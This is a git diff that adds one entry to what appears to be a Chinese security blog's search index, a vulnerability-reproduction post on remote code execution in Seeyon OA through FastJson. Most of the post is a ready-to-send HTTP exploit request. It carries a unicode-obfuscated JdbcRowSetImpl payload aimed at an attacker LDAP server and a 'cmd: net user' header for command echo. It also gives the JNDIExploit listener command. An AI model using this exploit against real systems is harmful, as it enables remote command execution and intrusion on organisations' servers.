@@ -31,6 +31,27 @@
     
     
     <entry>
+      <title>致远OA FastJson rce回显</title>
+      <link href="2021/06/29/%E8%87%B4%E8%BF%9COA-FastJson-rce%E5%9B%9E%E6%98%BE/"/>
+      <url>2021/06/29/%E8%87%B4%E8%BF%9COA-FastJson-rce%E5%9B%9E%E6%98%BE/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="自行搭建环境"><a href="#自行搭建环境" class="headerlink" title="自行搭建环境"></a>自行搭建环境</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/pasted-12.png" alt="upload successful"></p><h3 id="漏洞路径"><a href="#漏洞路径" class="headerlink" title="漏洞路径"></a>漏洞路径</h3><pre><code>/seeyon/main.do?method=changeLocale</code></pre><h3 id="构造利用数据包"><a href="#构造利用数据包" class="headerlink" title="构造利用数据包"></a>构造利用数据包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;seeyon&#x2F;main.do?method&#x3D;changeLocale HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.88:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">cmd: net user</span><br><span class="line">Content-Length: 713</span><br><span class="line"></span><br><span class="line">_json_params&#x3D;&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073&quot;,&quot;\u0076\u0061\u006c&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;:&quot;ldap:&#x2F;&#x2F;xx.xx.xx.xx&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/pasted-13.png" alt="upload successful"></p><h3 id="命令回显"><a href="#命令回显" class="headerlink" title="命令回显"></a>命令回显</h3><p>利用feihong大佬的利用工具直接进行回显</p><h4 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h4><pre><code>java -jar JNDIExploit-1.2-SNAPSHOT.jar -p 7743 -i xx.xx.xx.xx</code></pre><p><img src= "/img/loading.gif" data-lazy-src="/images/pasted-14.png" alt="upload successful"></p><h4 id="直接使用tomcatecho-进行回显"><a href="#直接使用tomcatecho-进行回显" class="headerlink" title="直接使用tomcatecho 进行回显"></a>直接使用tomcatecho 进行回显</h4><p><img src= "/img/loading.gif" data-lazy-src="/images/pasted-15.png" alt="upload successful"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 致远oa </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>蓝凌OA XmlDecoder getshell</title>
       <link href="2021/06/29/%E8%93%9D%E5%87%8COA-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getshell/"/>
       <url>2021/06/29/%E8%93%9D%E5%87%8COA-ssrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getshell/</url>
